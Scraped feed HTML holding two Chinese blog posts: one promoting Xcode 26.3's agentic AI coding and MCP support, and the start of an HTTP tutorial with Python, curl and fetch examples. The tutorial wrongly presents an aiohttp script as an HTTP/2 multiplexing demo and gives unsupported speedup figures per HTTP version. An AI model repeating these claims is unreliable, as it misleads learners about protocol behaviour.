                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>昨天打开 Xcode 更新，差点以为看错了。</p>
<p>苹果官方内置 Claude 和 GPT？还支持 MCP 协议？</p>
<p>这不是愚人节玩笑，是 Xcode 26.3 的真实更新。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd3624bbd36c4ba49bcad75bed268f6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770914&amp;x-signature=iSl7Uvwe5SiBdjx3tkOYS58rEH0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-0">什么是 Agentic Coding？</h3>
<p>简单说：<strong>AI 不只是补全代码了，它能自己干活。</strong></p>
<p>以前的 AI 编程助手，你问一句它答一句，像个被动的搜索引擎。</p>
<p>Agentic Coding 不一样。你告诉它目标，它自己：</p>
<ul>
<li>• 拆解任务</li>
<li>• 分析项目架构</li>
<li>• 搜索文档</li>
<li>• 修改代码</li>
<li>• 跑构建</li>
<li>• 发现问题自己改</li>
</ul>
<p><strong>你只管提需求，它负责实现。</strong></p>
<h3 data-id="heading-1">内置两大王牌 AI</h3>
<p>打开 Xcode 设置，你会看到两个一键安装选项：</p>
<p><strong>1. Anthropic Claude Agent</strong><br/>
擅长复杂推理、长上下文理解，代码质量高</p>
<p><strong>2. OpenAI Codex</strong><br/>
老牌代码生成模型，速度快，覆盖面广</p>
<p>不想用这俩？没关系。</p>
<p>Xcode 26.3 全面支持 <strong>MCP（Model Context Protocol）</strong> 开放协议。</p>
<p>任何兼容 MCP 的 AI Agent 都能接入，不绑定特定厂商。</p>
<p>这招很苹果——既给你便利，又留足扩展空间。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/668b9340a0244c1a9bb6be1106f50185~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770914&amp;x-signature=%2FnsgzIKS%2F3W5OoGYVlH4MlB9tF8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">最惊艳的功能：可视化验证</h3>
<p>AI 写完代码，怎么知道对不对？</p>
<p>以前：手动跑，手动看，手动改。</p>
<p>现在：<strong>Agent 自己截取 Xcode Preview 验证效果。</strong></p>
<p>不对？它自己迭代修复。</p>
<p>构建失败？它分析报错，调整代码，重新构建。</p>
<p>整个过程你可以喝咖啡等着。</p>
<p>完成后，Agent 会用自然语言总结做了什么改动。</p>
<p>不满意？<strong>一键回滚到任意历史节点。</strong></p>
<h3 data-id="heading-3">能做什么？</h3>
<p>实测了几个场景：</p>
<p><strong>场景一：新功能开发</strong></p>
<blockquote>
<p>"给这个 App 加一个深色模式切换"</p>
</blockquote>
<p>Agent 自动分析现有主题结构，创建颜色配置，修改所有相关视图，跑 Preview 验证效果。</p>
<p><strong>场景二：Bug 修复</strong></p>
<blockquote>
<p>"用户反馈列表滚动时偶尔卡顿"</p>
</blockquote>
<p>Agent 检查列表实现，发现图片加载阻塞主线程，改成异步加载，验证流畅度。</p>
<p><strong>场景三：代码重构</strong></p>
<blockquote>
<p>"把网络层改成 async/await"</p>
</blockquote>
<p>Agent 识别所有 completion handler 调用，逐个改造，确保编译通过和功能正常。</p>
<h3 data-id="heading-4">开发者怎么看？</h3>
<p>苹果开发者关系副总裁的原话：</p>
<blockquote>
<p>"Agentic coding supercharges productivity and creativity, streamlining the development workflow."</p>
</blockquote>
<p>翻译一下：<strong>让开发者专注创新，把重复劳动交给 AI。</strong></p>
<p>从 WWDC25 的智能代码助手，到现在的完整 Agent 支持，苹果的 AI 布局越来越清晰。</p>
<p>不是取代开发者，是让开发者更强。</p>
<h3 data-id="heading-5">怎么升级？</h3>
<p><strong>现在可用：</strong> Release Candidate 版本（17C519）<br/>
<strong>适用对象：</strong> Apple Developer Program 会员<br/>
<strong>正式发布：</strong> 即将上架 App Store</p>
<p>建议先在测试项目上体验，等正式版再用于生产环境。</p>
<hr/>
<h2 data-id="heading-6">写在最后</h2>
<p>这次更新的意义，不只是 Xcode 多了几个功能。</p>
<p>而是苹果正式拥抱了 <strong>AI Agent 编程范式</strong>。</p>
<p>从"人写代码"到"人指挥 AI 写代码"，开发方式正在发生根本性变化。</p>
<p>作为 iOS 开发者，现在是时候适应这个新伙伴了。</p>
<p><strong>你打算怎么用 Xcode 的 AI Agent？评论区聊聊！</strong></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HTTP协议完全指南：从入门到精通]]></title>    <link>https://juejin.cn/post/7602455806446616582</link>    <guid>https://juejin.cn/post/7602455806446616582</guid>    <pubDate>2026-02-04T00:47:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602455806446616582" data-draft-id="7600764857768640562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HTTP协议完全指南：从入门到精通"/> <meta itemprop="keywords" content="网络协议,前端,后端"/> <meta itemprop="datePublished" content="2026-02-04T00:47:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怕浪猫"/> <meta itemprop="url" content="https://juejin.cn/user/2832784963939438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HTTP协议完全指南：从入门到精通
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2832784963939438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怕浪猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:47:03.000Z" title="Wed Feb 04 2026 00:47:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、HTTP是什么？</h2>
<p><strong>HTTP</strong>（HyperText Transfer Protocol，超文本传输协议）是互联网上应用最为广泛的一种网络协议。它定义了客户端（通常是浏览器）如何与服务器通信，以及服务器如何返回响应。</p>
<blockquote>
<p><strong>简单理解</strong>：HTTP就像是互联网的"语言规则"，让浏览器和服务器能够互相理解对方的"话"。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0b74dafd34343a1a20d11628cb58703~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=vKJhi0llFNyUnJIARNVjgUZAg7k%3D" alt="OSI模型中的HTTP" loading="lazy"/></p>
<p>HTTP工作在<strong>应用层（Application Layer）</strong>，基于TCP/IP协议族工作，默认使用<strong>80端口</strong>（HTTPS使用443端口）。</p>
<hr/>
<h2 data-id="heading-1">二、HTTP工作原理：请求-响应模型</h2>
<p>HTTP采用经典的**请求-响应（Request-Response）**模型，整个过程就像一次"对话"：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbf4ec8856f24070b01093a4611273c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=ONynP8jdluwOedJ0kdjk2slYHeA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">完整通信流程</h3>
<pre><code class="hljs">1️⃣ 建立TCP连接（三次握手）
2️⃣ 客户端发送HTTP请求
3️⃣ 服务器处理请求
4️⃣ 服务器返回HTTP响应  
5️⃣ 关闭连接（HTTP/1.0）或保持连接（HTTP/1.1+）
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69c48991bca741d797556feae5df54ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=mK6dFAt73oHEGNnPDKE1pbMEFsk%3D" alt="简单请求响应" loading="lazy"/></p>
<h3 data-id="heading-3">Python代码示例：查看完整HTTP过程</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> requests_toolbelt.utils <span class="hljs-keyword">import</span> dump

<span class="hljs-comment"># 发送请求并打印详细过程</span>
url = <span class="hljs-string">"https://httpbin.org/get"</span>
response = requests.get(url, params={<span class="hljs-string">"key"</span>: <span class="hljs-string">"value"</span>})

<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== 请求行 ==="</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Method: <span class="hljs-subst">{response.request.method}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"URL: <span class="hljs-subst">{response.request.url}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== 请求头 ==="</span>)
<span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> response.request.headers.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== 响应状态 ==="</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Status: <span class="hljs-subst">{response.status_code}</span> <span class="hljs-subst">{response.reason}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== 响应头 ==="</span>)
<span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> response.headers.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== 响应体（前200字符）==="</span>)
<span class="hljs-built_in">print</span>(response.text[:<span class="hljs-number">200</span>])
</code></pre>
<p><strong>运行结果：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">===</span> <span class="hljs-string">请求行</span> <span class="hljs-string">===</span>
<span class="hljs-attr">Method:</span> <span class="hljs-string">GET</span>
<span class="hljs-attr">URL:</span> <span class="hljs-string">https://httpbin.org/get?key=value</span>

<span class="hljs-string">===</span> <span class="hljs-string">请求头</span> <span class="hljs-string">===</span>
<span class="hljs-attr">User-Agent:</span> <span class="hljs-string">python-requests/2.28.1</span>
<span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">*/*</span>
<span class="hljs-attr">Connection:</span> <span class="hljs-string">keep-alive</span>

<span class="hljs-string">===</span> <span class="hljs-string">响应状态</span> <span class="hljs-string">===</span>
<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>

<span class="hljs-string">===</span> <span class="hljs-string">响应头</span> <span class="hljs-string">===</span>
<span class="hljs-attr">Date:</span> <span class="hljs-string">Mon,</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2024 10:00:00 </span><span class="hljs-string">GMT</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">256</span>
<span class="hljs-attr">Server:</span> <span class="hljs-string">gunicorn/19.9.0</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">三、HTTP版本演进史</h2>
<p>HTTP协议从1991年诞生至今，经历了多个重要版本：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e76dcf4849b48ff8dd747e9c959dc0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=KhhO388M0XE%2BOXx6u0p74cKMsvA%3D" alt="image (2).png" loading="lazy"/></p>









































<table><thead><tr><th>版本</th><th>年份</th><th>核心特性</th><th>性能提升</th></tr></thead><tbody><tr><td><strong>HTTP/0.9</strong></td><td>1991</td><td>仅支持GET，纯文本传输</td><td>基础版本</td></tr><tr><td><strong>HTTP/1.0</strong></td><td>1996</td><td>增加POST/HEAD，支持多媒体，短连接</td><td>1x</td></tr><tr><td><strong>HTTP/1.1</strong></td><td>1997</td><td><strong>持久连接</strong>、管道化、Host头、缓存控制</td><td>2-3x</td></tr><tr><td><strong>HTTP/2</strong></td><td>2015</td><td><strong>二进制分帧</strong>、<strong>多路复用</strong>、头部压缩(HPACK)、服务器推送</td><td>3-5x</td></tr><tr><td><strong>HTTP/3</strong></td><td>2022</td><td><strong>基于QUIC/UDP</strong>、0-RTT握手、连接迁移、更强的拥塞控制</td><td>5-10x</td></tr></tbody></table>
<h3 data-id="heading-5">HTTP/2 vs HTTP/1.1 多路复用演示</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> aiohttp
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">session, url</span>):
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> response:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.text()

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    urls = [<span class="hljs-string">"https://httpbin.org/delay/1"</span>] * <span class="hljs-number">3</span>
    
    <span class="hljs-comment"># HTTP/2 连接复用测试</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:
        start = time.time()
        <span class="hljs-keyword">await</span> asyncio.gather(*[fetch(session, url) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls])
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"HTTP/2 并行请求耗时: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.2</span>f}</span>秒"</span>)
        <span class="hljs-comment"># 结果约1秒（三个请求复用一个连接）</span>

asyncio.run(main())
</code></pre>
<hr/>
<h2 data-id="heading-6">四、HTTP报文结构详解</h2>
<p>HTTP报文分为<strong>请求报文</strong>和<strong>响应报文</strong>，结构相似：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83cfbdadf8d04805a14ce9ca435a9180~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=pi7uwrOjQiZDddzPCszfz1UIg0A%3D" alt="HTTP报文格式" loading="lazy"/></p>
<h3 data-id="heading-7">1. 请求报文结构</h3>
<pre><code class="hljs language-bash" lang="bash">POST /api/login HTTP/1.1          ← 请求行 (方法 + URI + 版本)
Host: api.example.com             │
Content-Type: application/json    ├ 请求头 (Headers)
Content-Length: 39                │
                                  ← 空行
{<span class="hljs-string">"username"</span>:<span class="hljs-string">"admin"</span>,<span class="hljs-string">"pwd"</span>:<span class="hljs-string">"123"</span>}  ← 请求体 (Body)
</code></pre>
<h3 data-id="heading-8">2. 响应报文结构</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>                   <span class="hljs-string">←</span> <span class="hljs-string">状态行</span> <span class="hljs-string">(版本</span> <span class="hljs-string">+</span> <span class="hljs-string">状态码</span> <span class="hljs-string">+</span> <span class="hljs-string">原因短语)</span>
<span class="hljs-attr">Date:</span> <span class="hljs-string">Mon,</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2024 10:00:00 </span><span class="hljs-string">GMT</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>    <span class="hljs-string">├</span> <span class="hljs-string">响应头</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">27</span>                <span class="hljs-string">│</span>
                                  <span class="hljs-string">←</span> <span class="hljs-string">空行</span>
{<span class="hljs-attr">"status":</span> <span class="hljs-string">"success"</span>}             <span class="hljs-string">←</span> <span class="hljs-string">响应体</span>
</code></pre>
<h3 data-id="heading-9">cURL命令查看原始报文</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看完整的HTTP请求和响应（包含TLS握手信息）</span>
curl -v https://api.github.com/users/github 2&gt;&amp;1 | <span class="hljs-built_in">head</span> -30

<span class="hljs-comment"># 只显示响应头</span>
curl -I https://httpbin.org/get

<span class="hljs-comment"># 发送POST请求并携带JSON数据</span>
curl -X POST https://httpbin.org/post \
     -H <span class="hljs-string">"Content-Type: application/json"</span> \
     -d <span class="hljs-string">'{"name": "kimi", "role": "AI"}'</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">五、HTTP方法（Methods）</h2>
<p>HTTP定义了多种请求方法，表示对资源的不同操作：</p>





























































<table><thead><tr><th>方法</th><th>幂等性</th><th>安全性</th><th>用途</th><th>示例</th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>✅</td><td>✅</td><td>获取资源</td><td>获取用户信息</td></tr><tr><td><strong>POST</strong></td><td>❌</td><td>❌</td><td>创建资源</td><td>用户注册</td></tr><tr><td><strong>PUT</strong></td><td>✅</td><td>❌</td><td>全量更新</td><td>修改用户资料</td></tr><tr><td><strong>PATCH</strong></td><td>❌</td><td>❌</td><td>局部更新</td><td>修改用户名</td></tr><tr><td><strong>DELETE</strong></td><td>✅</td><td>❌</td><td>删除资源</td><td>删除账号</td></tr><tr><td><strong>HEAD</strong></td><td>✅</td><td>✅</td><td>获取头部（不返回Body）</td><td>检查资源是否存在</td></tr><tr><td><strong>OPTIONS</strong></td><td>✅</td><td>✅</td><td>预检请求，查看支持的方法</td><td>CORS跨域预检</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>幂等性</strong>：多次执行结果相同（如PUT多次结果一致，POST每次都新建资源）</p>
</blockquote>
<h3 data-id="heading-11">JavaScript Fetch API示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// GET请求获取数据</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params">userId</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">${userId}</span>`</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
        <span class="hljs-attr">headers</span>: {
            <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'application/json'</span>,
            <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer token123'</span>
        }
    });
    
    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">${response.status}</span>`</span>);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}

